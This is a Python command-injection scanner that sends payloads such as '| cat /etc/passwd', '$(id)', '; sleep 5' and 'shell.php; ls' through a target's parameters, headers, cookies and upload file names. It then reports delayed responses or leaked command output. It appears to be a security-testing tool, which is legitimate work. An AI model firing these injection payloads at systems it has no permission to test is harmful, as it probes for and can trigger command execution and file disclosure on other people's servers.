import requests
import time
from urllib.parse import urljoin
from colorama import Fore, Style

class CommandInjectionScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.common_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def scan_command_injection(self):
        print(f"\n{Fore.CYAN}[*] Starting Command Injection Scan...{Style.RESET_ALL}")
        
        try:
            # Check for command injection in GET parameters
            self._check_get_parameters()
            
            # Check for command injection in POST parameters
            self._check_post_parameters()
            
            # Check for command injection in headers
            self._check_headers()
            
            # Check for command injection in cookies
            self._check_cookies()
            
            # Check for command injection in file uploads
            self._check_file_uploads()
            
            # Print results
            self._print_results()
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error scanning for command injection: {str(e)}{Style.RESET_ALL}")

    def _check_get_parameters(self):
        test_payloads = [
            '; ls',
            '& dir',
            '| cat /etc/passwd',
            '`id`',
            '$(id)',
            '; ping -c 1 127.0.0.1',
            '& ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '`ping -c 1 127.0.0.1`',
            '$(ping -c 1 127.0.0.1)',
            '; sleep 5',
            '& sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)'
        ]
        
        for payload in test_payloads:
            try:
                start_time = time.time()
                response = requests.get(
                    f"{self.target_url}?cmd={payload}",
                    headers=self.common_headers,
                    timeout=10
                )
                end_time = time.time()
                
                # Check for time-based injection
                if end_time - start_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-Based Command Injection',
                        'severity': 'High',
                        'description': f'Potential time-based command injection with payload: {payload}'
                    })
                
                # Check for command output in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'Command Output Injection',
                        'severity': 'High',
                        'description': f'Command output found in response with payload: {payload}'
                    })
            except:
                pass

    def _check_post_parameters(self):
        test_payloads = [
            '; ls',
            '& dir',
            '| cat /etc/passwd',
            '`id`',
            '$(id)',
            '; ping -c 1 127.0.0.1',
            '& ping -c 1 127.0.0.1',
            '| ping -c 1 127.0.0.1',
            '`ping -c 1 127.0.0.1`',
            '$(ping -c 1 127.0.0.1)',
            '; sleep 5',
            '& sleep 5',
            '| sleep 5',
            '`sleep 5`',
            '$(sleep 5)'
        ]
        
        for payload in test_payloads:
            try:
                start_time = time.time()
                response = requests.post(
                    self.target_url,
                    data={'cmd': payload},
                    headers=self.common_headers,
                    timeout=10
                )
                end_time = time.time()
                
                # Check for time-based injection
                if end_time - start_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-Based Command Injection',
                        'severity': 'High',
                        'description': f'Potential time-based command injection with payload: {payload}'
                    })
                
                # Check for command output in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'Command Output Injection',
                        'severity': 'High',
                        'description': f'Command output found in response with payload: {payload}'
                    })
            except:
                pass

    def _check_headers(self):
        test_payloads = [
            '; ls',
            '& dir',
            '| cat /etc/passwd',
            '`id`',
            '$(id)'
        ]
        
        for payload in test_payloads:
            try:
                headers = {
                    **self.common_headers,
                    'X-Forwarded-For': payload,
                    'User-Agent': payload,
                    'Referer': payload
                }
                
                start_time = time.time()
                response = requests.get(
                    self.target_url,
                    headers=headers,
                    timeout=10
                )
                end_time = time.time()
                
                # Check for time-based injection
                if end_time - start_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-Based Command Injection in Headers',
                        'severity': 'High',
                        'description': f'Potential time-based command injection in headers with payload: {payload}'
                    })
                
                # Check for command output in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'Command Output Injection in Headers',
                        'severity': 'High',
                        'description': f'Command output found in response from header injection with payload: {payload}'
                    })
            except:
                pass

    def _check_cookies(self):
        test_payloads = [
            '; ls',
            '& dir',
            '| cat /etc/passwd',
            '`id`',
            '$(id)'
        ]
        
        for payload in test_payloads:
            try:
                cookies = {
                    'session': payload,
                    'user': payload,
                    'id': payload
                }
                
                start_time = time.time()
                response = requests.get(
                    self.target_url,
                    cookies=cookies,
                    headers=self.common_headers,
                    timeout=10
                )
                end_time = time.time()
                
                # Check for time-based injection
                if end_time - start_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-Based Command Injection in Cookies',
                        'severity': 'High',
                        'description': f'Potential time-based command injection in cookies with payload: {payload}'
                    })
                
                # Check for command output in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'Command Output Injection in Cookies',
                        'severity': 'High',
                        'description': f'Command output found in response from cookie injection with payload: {payload}'
                    })
            except:
                pass

    def _check_file_uploads(self):
        test_payloads = [
            'shell.php; ls',
            'shell.php & dir',
            'shell.php | cat /etc/passwd',
            'shell.php `id`',
            'shell.php $(id)'
        ]
        
        for payload in test_payloads:
            try:
                files = {
                    'file': (payload, 'test content', 'application/octet-stream')
                }
                
                start_time = time.time()
                response = requests.post(
                    self.target_url,
                    files=files,
                    headers=self.common_headers,
                    timeout=10
                )
                end_time = time.time()
                
                # Check for time-based injection
                if end_time - start_time > 5:
                    self.vulnerabilities.append({
                        'type': 'Time-Based Command Injection in File Upload',
                        'severity': 'High',
                        'description': f'Potential time-based command injection in file upload with payload: {payload}'
                    })
                
                # Check for command output in response
                if any(indicator in response.text.lower() for indicator in ['root:', 'uid=', 'gid=', 'groups=']):
                    self.vulnerabilities.append({
                        'type': 'Command Output Injection in File Upload',
                        'severity': 'High',
                        'description': f'Command output found in response from file upload injection with payload: {payload}'
                    })
            except:
                pass

    def _print_results(self):
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}[+] No command injection vulnerabilities found{Style.RESET_ALL}")
            return

        print(f"\n{Fore.YELLOW}[!] Found {len(self.vulnerabilities)} potential issues:{Style.RESET_ALL}")
        for vuln in self.vulnerabilities:
            severity_color = {
                'High': Fore.RED,
                'Medium': Fore.YELLOW,
                'Low': Fore.BLUE,
                'Info': Fore.CYAN
            }.get(vuln['severity'], Fore.WHITE)
            
            print(f"\n{severity_color}[{vuln['severity']}] {vuln['type']}{Style.RESET_ALL}")
            print(f"Description: {vuln['description']}") 